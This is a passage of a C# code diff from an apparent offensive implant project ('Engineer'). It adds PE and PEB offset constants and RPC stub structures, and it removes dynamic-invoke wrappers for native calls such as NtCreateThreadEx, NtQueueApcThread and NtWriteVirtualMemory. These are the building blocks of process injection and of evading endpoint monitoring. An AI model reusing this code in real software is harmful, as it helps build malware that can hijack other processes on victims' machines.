+                    public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
+                    public IntPtr ProxyServerInfo;
+                    public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
+                    // Fields up to now present in win2000 release.
+
+                    public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
+                                            IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
+                    {
+                        pFormatTypes = pFormatTypesPtr;
+                        RpcInterfaceInformation = RpcInterfaceInformationPtr;
+                        CommFaultOffsets = IntPtr.Zero;
+                        pfnAllocate = pfnAllocatePtr;
+                        pfnFree = pfnFreePtr;
+                        pAutoBindHandle = IntPtr.Zero;
+                        apfnNdrRundownRoutines = IntPtr.Zero;
+                        aGenericBindingRoutinePairs = IntPtr.Zero;
+                        apfnExprEval = IntPtr.Zero;
+                        aXmitQuintuple = IntPtr.Zero;
+                        fCheckBounds = 1;
+                        Version = 0x50002u;
+                        pMallocFreeStruct = IntPtr.Zero;
+                        MIDLVersion = 0x801026e;
+                        aUserMarshalQuadruple = IntPtr.Zero;
+                        NotifyRoutineTable = IntPtr.Zero;
+                        mFlags = new IntPtr(0x00000001);
+                        CsRoutineTables = IntPtr.Zero;
+                        ProxyServerInfo = IntPtr.Zero;
+                        pExprInfo = IntPtr.Zero;
+                    }
+                }
+            }
         }
 
         /////////////////PE
         ///
         public class PE
         {
+
+            public const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
+            public const uint IMAGE_SCN_MEM_READ = 0x40000000;
+            public const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
+
+            public const int IDT_SINGLE_ENTRY_LENGTH = 20;
+            public const int IDT_IAT_OFFSET = 16;
+            public const int IDT_DLL_NAME_OFFSET = 12;
+            public const int ILT_HINT_LENGTH = 2;
+
+            public const int PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET = 0x20;
+            public const int RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET = 0x70;
+            public const int RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET = 2;
+            public const int RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET = 0x60;
+            public const int UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET = 0x8;
+            public const int PEB_BASE_ADDRESS_OFFSET = 0x10;
+
             // DllMain constants
             public const UInt32 DLL_PROCESS_DETACH = 0;
             public const UInt32 DLL_PROCESS_ATTACH = 1;
@@ -1594,46 +2303,52 @@ namespace Engineer.Extra
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);
 
+            //[Flags]
+            //public enum DataSectionFlags : uint
+            //{
+            //    TYPE_NO_PAD = 0x00000008,
+            //    CNT_CODE = 0x00000020,
+            //    CNT_INITIALIZED_DATA = 0x00000040,
+            //    CNT_UNINITIALIZED_DATA = 0x00000080,
+            //    LNK_INFO = 0x00000200,
+            //    LNK_REMOVE = 0x00000800,
+            //    LNK_COMDAT = 0x00001000,
+            //    NO_DEFER_SPEC_EXC = 0x00004000,
+            //    GPREL = 0x00008000,
+            //    MEM_FARDATA = 0x00008000,
+            //    MEM_PURGEABLE = 0x00020000,
+            //    MEM_16BIT = 0x00020000,
+            //    MEM_LOCKED = 0x00040000,
+            //    MEM_PRELOAD = 0x00080000,
+            //    ALIGN_1BYTES = 0x00100000,
+            //    ALIGN_2BYTES = 0x00200000,
+            //    ALIGN_4BYTES = 0x00300000,
+            //    ALIGN_8BYTES = 0x00400000,
+            //    ALIGN_16BYTES = 0x00500000,
+            //    ALIGN_32BYTES = 0x00600000,
+            //    ALIGN_64BYTES = 0x00700000,
+            //    ALIGN_128BYTES = 0x00800000,
+            //    ALIGN_256BYTES = 0x00900000,
+            //    ALIGN_512BYTES = 0x00A00000,
+            //    ALIGN_1024BYTES = 0x00B00000,
+            //    ALIGN_2048BYTES = 0x00C00000,
+            //    ALIGN_4096BYTES = 0x00D00000,
+            //    ALIGN_8192BYTES = 0x00E00000,
+            //    ALIGN_MASK = 0x00F00000,
+            //    LNK_NRELOC_OVFL = 0x01000000,
+            //    MEM_DISCARDABLE = 0x02000000,
+            //    MEM_NOT_CACHED = 0x04000000,
+            //    MEM_NOT_PAGED = 0x08000000,
+            //    MEM_SHARED = 0x10000000,
+            //    MEM_EXECUTE = 0x20000000,
+            //    MEM_READ = 0x40000000,
+            //    MEM_WRITE = 0x80000000
+            //}
+
             [Flags]
             public enum DataSectionFlags : uint
             {
-                TYPE_NO_PAD = 0x00000008,
-                CNT_CODE = 0x00000020,
-                CNT_INITIALIZED_DATA = 0x00000040,
-                CNT_UNINITIALIZED_DATA = 0x00000080,
-                LNK_INFO = 0x00000200,
-                LNK_REMOVE = 0x00000800,
-                LNK_COMDAT = 0x00001000,
-                NO_DEFER_SPEC_EXC = 0x00004000,
-                GPREL = 0x00008000,
-                MEM_FARDATA = 0x00008000,
-                MEM_PURGEABLE = 0x00020000,
-                MEM_16BIT = 0x00020000,
-                MEM_LOCKED = 0x00040000,
-                MEM_PRELOAD = 0x00080000,
-                ALIGN_1BYTES = 0x00100000,
-                ALIGN_2BYTES = 0x00200000,
-                ALIGN_4BYTES = 0x00300000,
-                ALIGN_8BYTES = 0x00400000,
-                ALIGN_16BYTES = 0x00500000,
-                ALIGN_32BYTES = 0x00600000,
-                ALIGN_64BYTES = 0x00700000,
-                ALIGN_128BYTES = 0x00800000,
-                ALIGN_256BYTES = 0x00900000,
-                ALIGN_512BYTES = 0x00A00000,
-                ALIGN_1024BYTES = 0x00B00000,
-                ALIGN_2048BYTES = 0x00C00000,
-                ALIGN_4096BYTES = 0x00D00000,
-                ALIGN_8192BYTES = 0x00E00000,
-                ALIGN_MASK = 0x00F00000,
-                LNK_NRELOC_OVFL = 0x01000000,
-                MEM_DISCARDABLE = 0x02000000,
-                MEM_NOT_CACHED = 0x04000000,
-                MEM_NOT_PAGED = 0x08000000,
-                MEM_SHARED = 0x10000000,
-                MEM_EXECUTE = 0x20000000,
-                MEM_READ = 0x40000000,
-                MEM_WRITE = 0x80000000
+                Stub = 0x00000000,
             }
 
             public struct IMAGE_DOS_HEADER
@@ -1953,774 +2668,291 @@ namespace Engineer.Extra
         /////////////////Native
         ///
 
-        public static NTSTATUS NtCreateThreadEx(
-            ref IntPtr threadHandle,
-            h_reprobate.Win32.WinNT.ACCESS_MASK desiredAccess,
-            IntPtr objectAttributes,
-            IntPtr processHandle,
-            IntPtr startAddress,
-            IntPtr parameter,
-            bool createSuspended,
-            int stackZeroBits,
-            int sizeOfStack,
-            int maximumStackSize,
-            IntPtr attributeList)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits,
-                sizeOfStack, maximumStackSize, attributeList
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateThreadEx",
-                typeof(DELEGATES.NtCreateThreadEx), ref funcargs);
-
-            // Update the modified variables
-            threadHandle = (IntPtr)funcargs[0];
-
-            return retValue;
-        }
-
-        public static NTSTATUS RtlCreateUserThread(
-                IntPtr Process,
-                IntPtr ThreadSecurityDescriptor,
-                bool CreateSuspended,
-                IntPtr ZeroBits,
-                IntPtr MaximumStackSize,
-                IntPtr CommittedStackSize,
-                IntPtr StartAddress,
-                IntPtr Parameter,
-                ref IntPtr Thread,
-                IntPtr ClientId)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                Process, ThreadSecurityDescriptor, CreateSuspended, ZeroBits,
-                MaximumStackSize, CommittedStackSize, StartAddress, Parameter,
-                Thread, ClientId
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"RtlCreateUserThread",
-                typeof(DELEGATES.RtlCreateUserThread), ref funcargs);
-
-            // Update the modified variables
-            Thread = (IntPtr)funcargs[8];
-
-            return retValue;
-        }
-
-        public static NTSTATUS NtCreateSection(
-            ref IntPtr SectionHandle,
-            uint DesiredAccess,
-            IntPtr ObjectAttributes,
-            ref ulong MaximumSize,
-            uint SectionPageProtection,
-            uint AllocationAttributes,
-            IntPtr FileHandle)
-        {
-
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateSection", typeof(DELEGATES.NtCreateSection), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Unable to create section, " + retValue);
-            }
-
-            // Update the modified variables
-            SectionHandle = (IntPtr)funcargs[0];
-            MaximumSize = (ulong)funcargs[3];
-
-            return retValue;
-        }
-
-        public static NTSTATUS NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                hProc, baseAddr
-            };
-
-            NTSTATUS result = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtUnmapViewOfSection",
-                typeof(DELEGATES.NtUnmapViewOfSection), ref funcargs);
-
-            return result;
-        }
-
-        public static NTSTATUS NtMapViewOfSection(
-            IntPtr SectionHandle,
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            IntPtr ZeroBits,
-            IntPtr CommitSize,
-            IntPtr SectionOffset,
-            ref ulong ViewSize,
-            uint InheritDisposition,
-            uint AllocationType,
-            uint Win32Protect)
-        {
-
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType,
-                Win32Protect
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtMapViewOfSection", typeof(DELEGATES.NtMapViewOfSection), ref funcargs);
-            if (retValue != NTSTATUS.Success && retValue != NTSTATUS.ImageNotAtBase)
-            {
-                throw new InvalidOperationException("Unable to map view of section, " + retValue);
-            }
-
-            // Update the modified variables.
-            BaseAddress = (IntPtr)funcargs[2];
-            ViewSize = (ulong)funcargs[6];
-
-            return retValue;
-        }
-
-        public static void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                DestinationString, SourceString
-            };
-
-            reprobate.DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
-
-            // Update the modified variables
-            DestinationString = (UNICODE_STRING)funcargs[0];
-        }
-
-        public static NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                PathToFile, dwFlags, ModuleFileName, ModuleHandle
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
-
-            // Update the modified variables
-            ModuleHandle = (IntPtr)funcargs[3];
-
-            return retValue;
-        }
-
-        public static void RtlZeroMemory(IntPtr Destination, int Length)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                Destination, Length
-            };
-
-            reprobate.DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
-        }
-
-        public static NTSTATUS NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
-        {
-            int processInformationLength;
-            UInt32 RetLen = 0;
-
-            switch (processInfoClass)
-            {
-                case PROCESSINFOCLASS.ProcessWow64Information:
-                    pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
-                    RtlZeroMemory(pProcInfo, IntPtr.Size);
-                    processInformationLength = IntPtr.Size;
-                    break;
-                case PROCESSINFOCLASS.ProcessBasicInformation:
-                    PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();
-                    pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
-                    RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
-                    Marshal.StructureToPtr(PBI, pProcInfo, true);
-                    processInformationLength = Marshal.SizeOf(PBI);
-                    break;
-                default:
-                    throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
-            }
-
-            object[] funcargs =
-            {
-                hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-
-            // Update the modified variables
-            pProcInfo = (IntPtr)funcargs[2];
-
-            return retValue;
-        }
-
-        public static bool NtQueryInformationProcessWow64Information(IntPtr hProcess)
-        {
-            NTSTATUS retValue = NtQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessWow64Information, out IntPtr pProcInfo);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-
-            if (Marshal.ReadIntPtr(pProcInfo) == IntPtr.Zero)
-            {
-                return false;
-            }
-            return true;
-        }
-
-        public static PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
-        {
-            NTSTATUS retValue = NtQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, out IntPtr pProcInfo);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-
-            return (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));
-        }
-
-        public static IntPtr NtOpenProcess(UInt32 ProcessId, h_reprobate.Win32.Kernel32.ProcessAccessFlags DesiredAccess)
-        {
-            // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
-            IntPtr ProcessHandle = IntPtr.Zero;
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
-            CLIENT_ID ci = new CLIENT_ID();
-            ci.UniqueProcess = (IntPtr)ProcessId;
-
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                ProcessHandle, DesiredAccess, oa, ci
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenProcess", typeof(DELEGATES.NtOpenProcess), ref funcargs);
-            if (retValue != NTSTATUS.Success && retValue == NTSTATUS.InvalidCid)
-            {
-                throw new InvalidOperationException("An invalid client ID was specified.");
-            }
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-
-            // Update the modified variables
-            ProcessHandle = (IntPtr)funcargs[0];
-
-            return ProcessHandle;
-        }
-
-        public static void NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtQueueApcThread", typeof(DELEGATES.NtQueueApcThread), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Unable to queue APC, " + retValue);
-            }
-        }
-
-        public static IntPtr NtOpenThread(int TID, h_reprobate.Win32.Kernel32.ThreadAccess DesiredAccess)
-        {
-            // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
-            IntPtr ThreadHandle = IntPtr.Zero;
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
-            CLIENT_ID ci = new CLIENT_ID();
-            ci.UniqueThread = (IntPtr)TID;
-
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                ThreadHandle, DesiredAccess, oa, ci
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenThread", typeof(DELEGATES.NtOpenProcess), ref funcargs);
-            if (retValue != NTSTATUS.Success && retValue == NTSTATUS.InvalidCid)
-            {
-                throw new InvalidOperationException("An invalid client ID was specified.");
-            }
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-
-            // Update the modified variables
-            ThreadHandle = (IntPtr)funcargs[0];
-
-            return ThreadHandle;
-        }
-
-        public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, h_reprobate.Win32.Kernel32.AllocationType AllocationType, UInt32 Protect)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(DELEGATES.NtAllocateVirtualMemory), ref funcargs);
-            if (retValue == NTSTATUS.AccessDenied)
-            {
-                // STATUS_ACCESS_DENIED
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-            if (retValue == NTSTATUS.AlreadyCommitted)
-            {
-                // STATUS_ALREADY_COMMITTED
-                throw new InvalidOperationException("The specified address range is already committed.");
-            }
-            if (retValue == NTSTATUS.CommitmentLimit)
-            {
-                // STATUS_COMMITMENT_LIMIT
-                throw new InvalidOperationException("Your system is low on virtual memory.");
-            }
-            if (retValue == NTSTATUS.ConflictingAddresses)
-            {
-                // STATUS_CONFLICTING_ADDRESSES
-                throw new InvalidOperationException("The specified address range conflicts with the address space.");
-            }
-            if (retValue == NTSTATUS.InsufficientResources)
-            {
-                // STATUS_INSUFFICIENT_RESOURCES
-                throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
-            }
-            if (retValue == NTSTATUS.InvalidHandle)
-            {
-                // STATUS_INVALID_HANDLE
-                throw new InvalidOperationException("An invalid HANDLE was specified.");
-            }
-            if (retValue == NTSTATUS.InvalidPageProtection)
-            {
-                // STATUS_INVALID_PAGE_PROTECTION
-                throw new InvalidOperationException("The specified page protection was not valid.");
-            }
-            if (retValue == NTSTATUS.NoMemory)
-            {
-                // STATUS_NO_MEMORY
-                throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
-            }
-            if (retValue == NTSTATUS.ObjectTypeMismatch)
-            {
-                // STATUS_OBJECT_TYPE_MISMATCH
-                throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
-            }
-            if (retValue != NTSTATUS.Success)
-            {
-                // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
-                throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
-            }
-
-            BaseAddress = (IntPtr)funcargs[1];
-            return BaseAddress;
-        }
-
-        public static void NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, h_reprobate.Win32.Kernel32.AllocationType FreeType)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                ProcessHandle, BaseAddress, RegionSize, FreeType
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtFreeVirtualMemory", typeof(DELEGATES.NtFreeVirtualMemory), ref funcargs);
-            if (retValue == NTSTATUS.AccessDenied)
-            {
-                // STATUS_ACCESS_DENIED
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-            if (retValue == NTSTATUS.InvalidHandle)
-            {
-                // STATUS_INVALID_HANDLE
-                throw new InvalidOperationException("An invalid HANDLE was specified.");
-            }
-            if (retValue != NTSTATUS.Success)
-            {
-                // STATUS_OBJECT_TYPE_MISMATCH == 0xC0000024
-                throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
-            }
-        }
-
-        public static string GetFilenameFromMemoryPointer(IntPtr hProc, IntPtr pMem)
-        {
-            // Alloc buffer for result struct
-            IntPtr pBase = IntPtr.Zero;
-            IntPtr RegionSize = (IntPtr)0x500;
-            IntPtr pAlloc = NtAllocateVirtualMemory(hProc, ref pBase, IntPtr.Zero, ref RegionSize, h_reprobate.Win32.Kernel32.AllocationType.Commit | h_reprobate.Win32.Kernel32.AllocationType.Reserve, h_reprobate.Win32.WinNT.PAGE_READWRITE);
-
-            // Prepare NtQueryVirtualMemory parameters
-            MEMORYINFOCLASS memoryInfoClass = MEMORYINFOCLASS.MemorySectionName;
-            UInt32 MemoryInformationLength = 0x500;
-            UInt32 Retlen = 0;
-
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                hProc, pMem, memoryInfoClass, pAlloc, MemoryInformationLength, Retlen
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryVirtualMemory", typeof(DELEGATES.NtQueryVirtualMemory), ref funcargs);
-
-            string FilePath = string.Empty;
-            if (retValue == NTSTATUS.Success)
-            {
-                UNICODE_STRING sn = (UNICODE_STRING)Marshal.PtrToStructure(pAlloc, typeof(UNICODE_STRING));
-                FilePath = Marshal.PtrToStringUni(sn.Buffer);
-            }
-
-            // Free allocation
-            NtFreeVirtualMemory(hProc, ref pAlloc, ref RegionSize, h_reprobate.Win32.Kernel32.AllocationType.Reserve);
-            if (retValue == NTSTATUS.AccessDenied)
-            {
-                // STATUS_ACCESS_DENIED
-                throw new UnauthorizedAccessException("Access is denied.");
-            }
-            if (retValue == NTSTATUS.AccessViolation)
-            {
-                // STATUS_ACCESS_VIOLATION
-                throw new InvalidOperationException("The specified base address is an invalid virtual address.");
-            }
-            if (retValue == NTSTATUS.InfoLengthMismatch)
-            {
-                // STATUS_INFO_LENGTH_MISMATCH
-                throw new InvalidOperationException("The MemoryInformation buffer is larger than MemoryInformationLength.");
-            }
-            if (retValue == NTSTATUS.InvalidParameter)
-            {
-                // STATUS_INVALID_PARAMETER
-                throw new InvalidOperationException("The specified base address is outside the range of accessible addresses.");
-            }
-            return FilePath;
-        }
-
-        public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect)
-        {
-            // Craft an array for the arguments
-            UInt32 OldProtect = 0;
-            object[] funcargs =
-            {
-                ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed to change memory protection, " + retValue);
-            }
-
-            OldProtect = (UInt32)funcargs[4];
-            return OldProtect;
-        }
-
-        public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
-        {
-            // Craft an array for the arguments
-            UInt32 BytesWritten = 0;
-            object[] funcargs =
-            {
-                ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed to write memory, " + retValue);
-            }
-
-            BytesWritten = (UInt32)funcargs[4];
-            return BytesWritten;
-        }
-
-        public static IntPtr LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                hModule, FunctionName, Ordinal, FunctionAddress
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"LdrGetProcedureAddress", typeof(DELEGATES.LdrGetProcedureAddress), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed get procedure address, " + retValue);
-            }
-
-            FunctionAddress = (IntPtr)funcargs[3];
-            return FunctionAddress;
-        }
-
-        public static void RtlGetVersion(ref OSVERSIONINFOEX VersionInformation)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                VersionInformation
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"RtlGetVersion", typeof(DELEGATES.RtlGetVersion), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed get procedure address, " + retValue);
-            }
-
-            VersionInformation = (OSVERSIONINFOEX)funcargs[0];
-        }
-
-        public static UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, ref UInt32 NumberOfBytesToRead)
-        {
-            // Craft an array for the arguments
-            UInt32 NumberOfBytesRead = 0;
-            object[] funcargs =
-            {
-                ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtReadVirtualMemory", typeof(DELEGATES.NtReadVirtualMemory), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed to read memory, " + retValue);
-            }
-
-            NumberOfBytesRead = (UInt32)funcargs[4];
-            return NumberOfBytesRead;
-        }
-
-        public static IntPtr NtOpenFile(ref IntPtr FileHandle, h_reprobate.Win32.Kernel32.FileAccessFlags DesiredAccess, ref OBJECT_ATTRIBUTES ObjAttr, ref IO_STATUS_BLOCK IoStatusBlock, h_reprobate.Win32.Kernel32.FileShareFlags ShareAccess, h_reprobate.Win32.Kernel32.FileOpenFlags OpenOptions)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                FileHandle, DesiredAccess, ObjAttr, IoStatusBlock, ShareAccess, OpenOptions
-            };
-
-            NTSTATUS retValue = (NTSTATUS)reprobate.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenFile", typeof(DELEGATES.NtOpenFile), ref funcargs);
-            if (retValue != NTSTATUS.Success)
-            {
-                throw new InvalidOperationException("Failed to open file, " + retValue);
-            }
-
-
-            FileHandle = (IntPtr)funcargs[0];
-            return FileHandle;
-        }
 
         /// <summary>
         /// Holds delegates for API calls in the NT Layer.
-        /// Must be public so that they may be used with SharpSploit.Execution.DynamicInvoke.Generic.DynamicFunctionInvoke
         /// </summary>
-        /// <example>
-        /// 
-        /// // These delegates may also be used directly.
-        ///
-        /// // Get a pointer to the NtCreateThreadEx function.
-        /// IntPtr pFunction = Execution.DynamicInvoke.Generic.GetLibraryAddress(@"ntdll.dll", "NtCreateThreadEx");
-        /// 
-        /// //  Create an instance of a NtCreateThreadEx delegate from our function pointer.
-        /// DELEGATES.NtCreateThreadEx createThread = (NATIVE_DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(
-        ///    pFunction, typeof(NATIVE_DELEGATES.NtCreateThreadEx));
-        ///
-        /// //  Invoke NtCreateThreadEx using the delegate
-        /// createThread(ref threadHandle, h_reprobate.Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | h_reprobate.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero,
-        ///     procHandle, startAddress, IntPtr.Zero, NT_CREATION_FLAGS.HIDE_FROM_DEBUGGER, 0, 0, 0, IntPtr.Zero);
-        /// 
-        /// </example>
-        public struct DELEGATES
+        public struct NT_DELEGATES
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate NTSTATUS NtCreateThreadEx(
-                out IntPtr threadHandle,
-                h_reprobate.Win32.WinNT.ACCESS_MASK desiredAccess,
-                IntPtr objectAttributes,
-                IntPtr processHandle,
-                IntPtr startAddress,
-                IntPtr parameter,
-                bool createSuspended,
-                int stackZeroBits,
-                int sizeOfStack,
-                int maximumStackSize,
-                IntPtr attributeList);
+            public delegate NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, h_DynInv.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate NTSTATUS RtlCreateUserThread(
-                IntPtr Process,
-                IntPtr ThreadSecurityDescriptor,
-                bool CreateSuspended,
-                IntPtr ZeroBits,
-                IntPtr MaximumStackSize,
-                IntPtr CommittedStackSize,
-                IntPtr StartAddress,
-                IntPtr Parameter,
-                ref IntPtr Thread,
-                IntPtr ClientId);
+            public delegate NTSTATUS RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, IntPtr ZeroBits, IntPtr MaximumStackSize, IntPtr CommittedStackSize, IntPtr StartAddress, IntPtr Parameter, ref IntPtr Thread, IntPtr ClientId);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate NTSTATUS NtCreateSection(
-                ref IntPtr SectionHandle,
-                uint DesiredAccess,
-                IntPtr ObjectAttributes,
-                ref ulong MaximumSize,
